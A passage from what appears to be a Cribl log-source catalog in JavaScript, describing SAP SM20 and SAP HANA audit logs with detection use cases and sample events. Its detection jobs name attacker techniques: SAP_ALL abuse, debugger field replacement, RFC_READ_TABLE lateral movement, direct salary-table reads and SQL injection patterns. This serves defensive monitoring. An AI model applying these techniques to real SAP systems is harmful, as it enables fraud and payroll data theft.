        sampleEvent: '{"Timestamp":"2026-06-17T06:00:12.000Z","Integration_Name":"Payroll_Feed_to_ADP","Integration_System_User":"ISU_Payroll_ADP","Integration_Type":"EIB","Execution_Status":"Completed","Start_Time":"2026-06-17T05:55:00.000Z","End_Time":"2026-06-17T06:00:12.000Z","Duration_Seconds":312,"Records_Processed":4523,"Records_Failed":2,"Output_Endpoint":"sftp://adp-secure.corp.internal/payroll/","Error_Message":"","Schedule":"Daily 0600 UTC","Launched_By":"Scheduled","Tenant":"cribl-prod-1","API_Calls_Used":47,"Rate_Limit_Remaining":953}'
      }
    ]
  },
  {
    category: 'ERP / Business Applications',
    icon: '🏢',
    sources: [
      {
        id: 'sap-sm20-audit',
        name: 'SAP Security Audit Log (SM20/SAL)',
        vendor: 'SAP',
        description: 'SAP Security Audit Log (transaction SM20 / RSAU* programs) records security-relevant activities across SAP NetWeaver ABAP systems including dialog/RFC logons, transaction starts, report executions, authorization failures, user master changes, and critical system events. SAP S/4HANA uses the enhanced Security Audit Log (SAL) with improved filtering and archiving. Collected via SAP Audit Log connector, RFC-based extraction, or SAP Enterprise Threat Detection (ETD) forwarding.',
        status: 'available',
        useCases: ['Privileged Transaction Monitoring', 'SAP_ALL Authorization Abuse', 'RFC/Dialog Logon Anomalies', 'Transaction Code Abuse Detection', 'User Master Record Changes', 'Debug & Replace Attacks', 'Client-Specific Access Violations', 'Critical Table Access (SE16N)', 'Transport System Abuse', 'Emergency Access (Firefighter) Logging'],
        personas: ['SOC', 'SAP Security', 'Compliance', 'Internal Audit', 'Basis Administration', 'GRC'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect SAP_ALL authorization abuse by alerting on users granted or using SAP_ALL profile outside designated Firefighter/emergency access procedures — correlating SM20 authorization check events with SU01 user master changes and PFCG role modifications' },
            { persona: 'Data End User / Analyst', job: 'Investigate debug & replace attacks by correlating SM20 events showing /H debugger activation during production transaction execution, especially on financial transactions (FB01, F110, ME21N) where field values were modified at runtime' },
            { persona: 'Data Content Creator', job: 'Build RFC-based lateral movement detection by alerting on RFC logon events from unexpected source systems, trusted RFC connections used by non-system accounts, or RFC function module calls to sensitive BAPIs (USER_CHANGE, RFC_READ_TABLE)' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Basis Administration', job: 'Monitor SAP system health by tracking logon failures, expired passwords, locked accounts, and work process consumption from SM20 dialog logon events — correlating with SM66 work process data to identify resource-intensive sessions' },
            { persona: 'Platform Operator', job: 'Track SAP transport system activity by monitoring STMS transaction executions, transport release events, and import activity across DEV/QAS/PRD landscape to detect unauthorized production transports or bypassed quality gates' },
            { persona: 'GRC', job: 'Monitor Firefighter/emergency access sessions in real-time by tracking GRC Access Control (formerly Virsa) session initiation, transaction usage during elevated sessions, and session duration compliance against time-boxed approval windows' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter repetitive successful authorization check events (AU3 message class — often 80-90% of SM20 volume on busy systems) while preserving logon events (AU1/AU2), transaction starts (AUW), user changes (AUF), and authorization failures for security analysis' },
            { persona: 'Data Engineer', job: 'Route critical security events (logon failures, SAP_ALL usage, debug events, Firefighter sessions, SE16N direct table access) to SIEM for real-time alerting while streaming full SM20 archive to Lake for SOX compliance retention' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Satisfy SOX ITGC requirements for SAP change management and access control by maintaining externalized SM20 audit trail exceeding SAP native reorganization schedules — demonstrating segregation of duties enforcement and privileged access controls' },
            { persona: 'Internal Audit', job: 'Generate quarterly segregation of duties evidence by correlating SM20 transaction usage patterns with role assignments to identify users executing incompatible transaction combinations (e.g., ME21N create PO + MIGO goods receipt + MIRO invoice verification)' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure SM20 extraction via SAP RFC connector (function module RSAU_READ_AUDITLOG_EXT) with Cribl Stream RFC source, or forward from SAP Enterprise Threat Detection (ETD) via syslog/CEF — filter profiles configured at SAP kernel level (rslg/audit_*)' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'SAP RFC connector (RSAU_READ_AUDITLOG_EXT / BAPI_XMI_LOGON) / SAP Enterprise Threat Detection (ETD) syslog/CEF forward / SAP Audit Management (SM21/RSAU_CONFIG) file export / SAP Cloud Connector for S/4HANA Cloud',
        logFormat: 'Structured SAP audit record — key fields: Date, Time, Client, User, Terminal (source IP/hostname), Transaction_Code, Report_Name, Message_Class (AU1=logon, AU2=logon_fail, AU3=auth_check, AUF=user_change, AUW=transaction_start, AUK=RFC), Message_Number, Message_Text, Audit_Class (Dialog/RFC/System), Event_Severity (0-3). SAP ETD normalizes to CEF format.',
        avgEPS: '5,000-500,000 EPS per SAP system (large production systems with full AU3 logging enabled; most organizations filter to AU1/AU2/AUF/AUW/AUK reducing to 10-50K EPS)',
        sampleEvent: '{"Date":"2026-06-17","Time":"14:32:08","Client":"100","User":"JSMITH","Terminal":"10.0.1.55","Transaction_Code":"SE16N","Report_Name":"SAPLSETB","Message_Class":"AUW","Message_Number":"001","Message_Text":"Transaction SE16N started","Audit_Class":"Dialog","Event_Severity":2,"Instance":"PRD_00","SID":"PRD","Source_System":"SAP ERP 6.0 EHP8","SAP_Release":"753"}'
      },
      {
        id: 'sap-hana-audit',
        name: 'SAP HANA Audit Trail',
        vendor: 'SAP',
        description: 'SAP HANA database audit trail captures all auditable activities at the database layer including SQL statement execution, user management, schema changes, data access on sensitive tables, system configuration changes, and license key operations. HANA audit policies define granular capture rules per user, schema, object, and action type. Available in SAP HANA on-premise (1.0/2.0), SAP HANA Cloud, and SAP BW/4HANA environments.',
        status: 'available',
        useCases: ['Direct HANA SQL Access Detection', 'Sensitive Table Data Export', 'SYSTEM User Activity Monitoring', 'Schema-Level Access Control Violations', 'HANA User Privilege Escalation', 'Calculation View Data Access', 'HDI Container Security', 'Backup & Recovery Auditing', 'Cross-Database Access Detection', 'SQL Injection Attempt Detection'],
        personas: ['SOC', 'DBA', 'SAP Security', 'Compliance', 'Data Engineering', 'Platform Engineering'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Detect direct HANA database access bypassing SAP application layer by alerting on SQL connections from non-SAP application servers — especially SELECT statements against HR/FI schemas (PA0008 salary, BSEG financial docs) from HANA Studio, DBeaver, or Python/JDBC clients' },
            { persona: 'Data End User / Analyst', job: 'Investigate SYSTEM account abuse by tracking all activities by HANA SYSTEM user or users with CATALOG READ, DATA ADMIN, or INIFILE ADMIN privileges — especially CREATE USER, GRANT, ALTER SYSTEM, and EXPORT operations' },
            { persona: 'Data Content Creator', job: 'Build SQL injection detection by analyzing HANA audit trail for unusual SQL patterns — UNION-based extraction, nested SELECT on system views (SYS.M_CONNECTIONS, SYS.USERS), or parameterized queries with excessive WHERE clause complexity targeting multiple schemas' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'DBA', job: 'Monitor HANA database health by tracking connection pool utilization, long-running statements (> 60s), memory allocation events (OOM warnings), savepoint durations, and delta merge operations from audit trail and alert log entries' },
            { persona: 'Platform Operator', job: 'Track HANA system replication status by monitoring SR_TAKEOVER, SR_REGISTER, and SR_UNREGISTER events alongside replication lag indicators from M_SERVICE_REPLICATION view to detect Active/Active read-enabled failover scenarios' },
            { persona: 'Data Engineer', job: 'Monitor HANA Calculation View performance by tracking execution times, memory consumption, and error rates for critical BW/4HANA queries and embedded analytics scenarios to identify views requiring optimization' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter successful SELECT audit events on non-sensitive application schemas and internal SAP system queries (_SYS_BIC, _SYS_REPO) that typically constitute 85-95% of HANA audit volume, while preserving DDL, DCL, admin commands, and access to PII-containing schemas' },
            { persona: 'Data Engineer', job: 'Route privilege escalation, SYSTEM user activity, direct SQL access, and schema DDL changes to SIEM for real-time detection while streaming full audit trail to Lake for forensic investigation and compliance retention' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Satisfy SOX/PCI-DSS database-level audit requirements by maintaining externalized HANA audit trail with tamper-evident forwarding — demonstrating that application-layer SAP controls cannot be bypassed via direct database access without detection' },
            { persona: 'Internal Audit', job: 'Generate evidence of database privilege reviews by reporting all HANA users with elevated privileges (CATALOG READ, DATA ADMIN, EXPORT, IMPORT) alongside their actual SQL statement history to verify least-privilege principle compliance' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure HANA audit trail forwarding via syslog target (ALTER SYSTEM ALTER AUDIT LOG ... SET SYSLOG), CSV file export (audit_trail_type = CSVTEXTFILE), or HANA cockpit API — define audit policies per schema/user/action matching security requirements' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (HANA audit target type SYSLOG) / CSV file monitor (CSVTEXTFILE audit trail) / HANA SQL connector (AUDIT_LOG system view) / SAP Enterprise Threat Detection (ETD) integration',
        logFormat: 'Structured audit record — key fields: TIMESTAMP, CLIENT_IP, CLIENT_PORT, CONNECTION_ID, STATEMENT_STRING, USER_NAME, SCHEMA_NAME, OBJECT_NAME, ACTION (SELECT/INSERT/UPDATE/DELETE/DDL/CONNECT/GRANT/REVOKE), AUDIT_POLICY_NAME, EXECUTED_STATEMENT, AUDIT_LEVEL (INFO/WARNING/ALERT/EMERGENCY), APPLICATION_NAME, HOST, PORT, SERVICE_NAME, SESSION_USER, CURRENT_SCHEMA. Syslog format follows RFC 5424 with structured data.',
        avgEPS: '10,000-1,000,000 EPS (HANA in-memory speed generates massive SELECT volume; most deployments filter to DDL + DCL + sensitive schema access at policy level, reducing to 5-50K EPS)',
        sampleEvent: '{"TIMESTAMP":"2026-06-17T14:32:08.234567","USER_NAME":"DBADMIN_EXTERNAL","SCHEMA_NAME":"SAPABAP1","OBJECT_NAME":"PA0008","ACTION":"SELECT","STATEMENT_STRING":"SELECT PERNR, ANSAL, DIVGV, WAESSION FROM SAPABAP1.PA0008 WHERE ENDDA >= 20260617","CLIENT_IP":"10.0.5.99","APPLICATION_NAME":"DBeaver 23.2","CONNECTION_ID":123456,"AUDIT_POLICY_NAME":"SENSITIVE_HR_ACCESS","AUDIT_LEVEL":"WARNING","HOST":"hana-prd-01","PORT":30015,"SERVICE_NAME":"indexserver","SESSION_USER":"DBADMIN_EXTERNAL","CURRENT_SCHEMA":"SAPABAP1"}'
      }
    ]
  }
];
